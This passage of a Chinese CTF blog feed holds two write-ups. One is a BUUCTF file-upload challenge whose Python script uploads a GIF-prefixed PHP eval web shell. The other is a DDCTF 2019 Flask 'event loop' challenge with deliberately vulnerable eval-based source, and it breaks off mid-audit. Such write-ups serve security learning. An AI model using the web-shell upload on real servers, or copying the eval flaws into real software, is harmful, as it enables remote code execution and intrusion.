class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;/&quot;</span>;</span><br><span class="line">        $ext = <span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">        @mkdir($sandbox, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !preg_match(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, $_GET[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Filename = $_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Filename = $sandbox.$_SESSION[<span class="string">&#x27;user&#x27;</span>].$ext;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = $_SESSION[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $sandbox;</span><br><span class="line">        <span class="keyword">global</span> $ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;[^a-z0-9]&quot;</span>, <span class="keyword">$this</span>-&gt;Filename))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>($file[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;you are too big (′▽`〃)&#x27;);&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;move_uploaded_file(&#x27;&quot;</span>.$file[<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span> . <span class="keyword">$this</span>-&gt;Filename . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $sandbox;</span><br><span class="line">        <span class="keyword">global</span> $ext;</span><br><span class="line">        <span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;Filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token != $_SESSION[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    $uploader = <span class="keyword">new</span> Uploader();</span><br><span class="line">    $uploader-&gt;upload($_FILES[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(@file_get_contents($uploader))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;下面是你上传的文件：&lt;br&gt;&quot;</span>.$uploader.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents($uploader);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这filename就直接控制了……</p><h4><span id="flag">flag</span></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding : utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">shell = <span class="string">&quot;&lt;?php @eval($_POST[&#x27;ok&#x27;]) ?&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;GIF8!&quot;</span></span><br><span class="line"><span class="comment">#   GIF8!</span></span><br><span class="line"><span class="comment">#   \xff\xd8</span></span><br><span class="line"><span class="comment">#   #define  counter_width 40 \n#define  counter_height 10</span></span><br><span class="line"></span><br><span class="line">con = prefix + <span class="string">&quot;\n&quot;</span> + shell</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://52b220e2-8b31-4060-bb76-cb7660d396fe.node4.buuoj.cn:81/upload.php?name=a.php&quot;</span></span><br><span class="line">cookie = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;6d3b93db04ced5af36d7fbc5fe9771a2&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0&#x27;</span>&#125;</span><br><span class="line">files = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;1.php&#x27;</span>, con, <span class="string">&#x27;image/jpeg&#x27;</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url=url, headers=headers, files=files, cookies=cookie)</span><br><span class="line"></span><br><span class="line">res = response.text</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><p>蚁剑连接，找<code>flag.php</code>获取flag……</p><h4><span id="phar">phar</span></h4><p><a href="https://blog.csdn.net/soldi_er/article/details/117702168">[GXYCTF2019]BabysqliV3.0-phar反序列化</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;文件上传、phar反序列化&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF-2019-homebrew event loop</title>
    <link href="http://example.com/2021/09/20/DDCTF-2019-homebrew%20event%20loop/"/>
    <id>http://example.com/2021/09/20/DDCTF-2019-homebrew%20event%20loop/</id>
    <published>2021-09-20T08:07:30.652Z</published>
    <updated>2021-09-20T10:43:06.080Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>python、flask、事件触发</p><a id="more"></a></blockquote><div class="toc" tabindex="1"><!-- toc --><ul><li><a href="#%E6%BA%90%E7%A0%81">源码</a></li><li><a href="#%E5%AE%A1%E8%AE%A1">审计</a></li><li><a href="#%E7%BB%95%E8%BF%87">绕过</a></li><li><a href="#%E4%BA%8B%E4%BB%B6%E8%A7%A6%E5%8F%91%E4%B8%8E%E6%A3%80%E6%B5%8B">事件触发与检测</a></li><li><a href="#flag">flag</a></li></ul><!-- tocstop --></div><br>#### 源码<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, Response</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;*********************&#x27;</span>  <span class="comment"># censored</span></span><br><span class="line">url_prefix = <span class="string">&#x27;/d5afe1f66147e857&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;*********************&#x27;</span>  <span class="comment"># censored</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span>(<span class="params">event</span>):</span></span><br><span class="line">    session[<span class="string">&#x27;log&#x27;</span>].append(event)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(session[<span class="string">&#x27;log&#x27;</span>]) &gt; <span class="number">5</span>:</span><br><span class="line">        session[<span class="string">&#x27;log&#x27;</span>] = session[<span class="string">&#x27;log&#x27;</span>][<span class="number">-5</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(event) == <span class="built_in">type</span>([]):</span><br><span class="line">        request.event_queue += event</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        request.event_queue.append(event)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span>(<span class="params">haystack, prefix, postfix=<span class="literal">None</span></span>):</span></span><br><span class="line">    haystack = haystack[haystack.find(prefix) + <span class="built_in">len</span>(prefix):]</span><br><span class="line">    <span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        haystack = haystack[:haystack.find(postfix)]</span><br><span class="line">    <span class="keyword">return</span> haystack</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RollBackException</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span>():</span></span><br><span class="line">    valid_event_chars = <span class="built_in">set</span>(</span><br><span class="line">        <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#x27;</span>)</span><br><span class="line">    resp = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(request.event_queue) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;</span></span><br><span class="line">        event = request.event_queue[<span class="number">0</span>]</span><br><span class="line">        request.event_queue = request.event_queue[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">&#x27;action:&#x27;</span>, <span class="string">&#x27;func:&#x27;</span>)):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> event:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            is_action = event[<span class="number">0</span>] == <span class="string">&#x27;a&#x27;</span></span><br><span class="line">            action = get_mid_str(event, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">            args = get_mid_str(event, action + <span class="string">&#x27;;&#x27;</span>).split(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                event_handler = <span class="built_in">eval</span>(</span><br><span class="line">                    action + (<span class="string">&#x27;_handler&#x27;</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">&#x27;_function&#x27;</span>))</span><br><span class="line">                ret_val = event_handler(args)</span><br><span class="line">            <span class="keyword">except</span> RollBackException:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;ERROR! All transactions have been cancelled. &lt;br /&gt;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">                session[<span class="string">&#x27;num_items&#x27;</span>] = request.prev_session[<span class="string">&#x27;num_items&#x27;</span>]</span><br><span class="line">                session[<span class="string">&#x27;points&#x27;</span>] = request.prev_session[<span class="string">&#x27;points&#x27;</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="comment"># resp += str(e) # only for debugging</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = ret_val</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    resp += ret_val</span><br><span class="line">    <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        resp = (<span class="string">&#x27;404 NOT FOUND&#x27;</span>, <span class="number">404</span>)</span><br><span class="line">    session.modified = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(url_prefix + &#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span>():</span></span><br><span class="line">    querystring = urllib.unquote(request.query_string)</span><br><span class="line">    request.event_queue = []</span><br><span class="line">    <span class="keyword">if</span> querystring == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">&#x27;action:&#x27;</span>)) <span class="keyword">or</span> <span class="built_in">len</span>(querystring) &gt; <span class="number">100</span>:</span><br><span class="line">        querystring = <span class="string">&#x27;action:index;False#False&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;num_items&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">&#x27;num_items&#x27;</span>] = <span class="number">0</span></span><br><span class="line">        session[<span class="string">&#x27;points&#x27;</span>] = <span class="number">3</span></span><br><span class="line">        session[<span class="string">&#x27;log&#x27;</span>] = []</span><br><span class="line">    request.prev_session = <span class="built_in">dict</span>(session)</span><br><span class="line">    trigger_event(querystring)</span><br><span class="line">    <span class="keyword">return</span> execute_event_loop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># handlers/functions below --------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    page = args[<span class="number">0</span>]</span><br><span class="line">    html = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    html += <span class="string">&#x27;[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">        session[<span class="string">&#x27;num_items&#x27;</span>], session[<span class="string">&#x27;points&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span> page == <span class="string">&#x27;index&#x27;</span>:</span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">&#x27;shop&#x27;</span>:</span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">&#x27;reset&#x27;</span>:</span><br><span class="line">        <span class="keyword">del</span> session[<span class="string">&#x27;num_items&#x27;</span>]</span><br><span class="line">        html += <span class="string">&#x27;Session reset.&lt;br /&gt;&#x27;</span></span><br><span class="line">    html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    bool_show_source = <span class="built_in">str</span>(args[<span class="number">0</span>])</span><br><span class="line">    bool_download_source = <span class="built_in">str</span>(args[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> bool_show_source == <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        source = <span class="built_in">open</span>(<span class="string">&#x27;eventLoop.py&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        html = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> bool_download_source != <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">            html += <span class="string">&#x27;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">            html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> source:</span><br><span class="line">            <span class="keyword">if</span> bool_download_source != <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">                html += line.replace(<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>).replace(<span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;&amp;nbsp;&#x27;</span> * <span class="number">4</span>).replace(</span><br><span class="line">                    <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&amp;nbsp;&#x27;</span>).replace(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).replace(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&lt;br /&gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                html += line</span><br><span class="line">        source.close()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> bool_download_source == <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">            headers = &#123;&#125;</span><br><span class="line">            headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">            headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=serve.py&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> Response(html, headers=headers)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        trigger_event(<span class="string">&#x27;action:view;index&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    num_items = <span class="built_in">int</span>(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;&#x27;</span>.<span class="built_in">format</span>(args[<span class="number">0</span>])</span><br><span class="line">    session[<span class="string">&#x27;num_items&#x27;</span>] += num_items</span><br><span class="line">    trigger_event([<span class="string">&#x27;func:consume_point;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">        num_items), <span class="string">&#x27;action:view;index&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span>(<span class="params">args</span>):</span></span><br><span class="line">    point_to_consume = <span class="built_in">int</span>(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;points&#x27;</span>] &lt; point_to_consume:</span><br><span class="line">        <span class="keyword">raise</span> RollBackException()</span><br><span class="line">    session[<span class="string">&#x27;points&#x27;</span>] -= point_to_consume</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span>(<span class="params">args</span>):</span></span><br><span class="line">    flag = args[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;You naughty boy! ;) &lt;br /&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;num_items&#x27;</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">        <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">        trigger_event(<span class="string">&#x27;func:show_flag;&#x27;</span> + FLAG())</span><br><span class="line">    trigger_event(<span class="string">&#x27;action:view;index&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span id="审计">审计</span></h4><p>程序入口：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(url_prefix + &#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span>():</span></span><br><span class="line">    querystring = urllib.unquote(request.query_string)</span><br><span class="line">    request.event_queue = []</span><br><span class="line">    <span class="keyword">if</span> querystring == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">&#x27;action:&#x27;</span>)) <span class="keyword">or</span> <span class="built_in">len</span>(querystring) &gt; <span class="number">100</span>:</span><br><span class="line">        querystring = <span class="string">&#x27;action:index;False#False&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;num_items&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">&#x27;num_items&#x27;</span>] = <span class="number">0</span></span><br><span class="line">        session[<span class="string">&#x27;points&#x27;</span>] = <span class="number">3</span></span><br><span class="line">        session[<span class="string">&#x27;log&#x27;</span>] = []</span><br><span class="line">    request.prev_session = <span class="built_in">dict</span>(session)</span><br><span class="line">    trigger_event(querystring)</span><br><span class="line">    <span class="keyword">return</span> execute_event_loop()</span><br></pre></td></tr></table></figure><p><code>query_string</code>：<a href="https://blog.csdn.net/weixin_45950544/article/details/103909413">https://blog.csdn.net/weixin_45950544/article/details/103909413</a></p><p><code>trigger_event</code>：添加事件到消息队列</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span>(<span class="params">event</span>):</span></span><br><span class="line">    session[<span class="string">&#x27;log&#x27;</span>].append(event)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(session[<span class="string">&#x27;log&#x27;</span>]) &gt; <span class="number">5</span>:</span><br><span class="line">        session[<span class="string">&#x27;log&#x27;</span>] = session[<span class="string">&#x27;log&#x27;</span>][<span class="number">-5</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(event) == <span class="built_in">type</span>([]):</span><br><span class="line">        request.event_queue += event</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        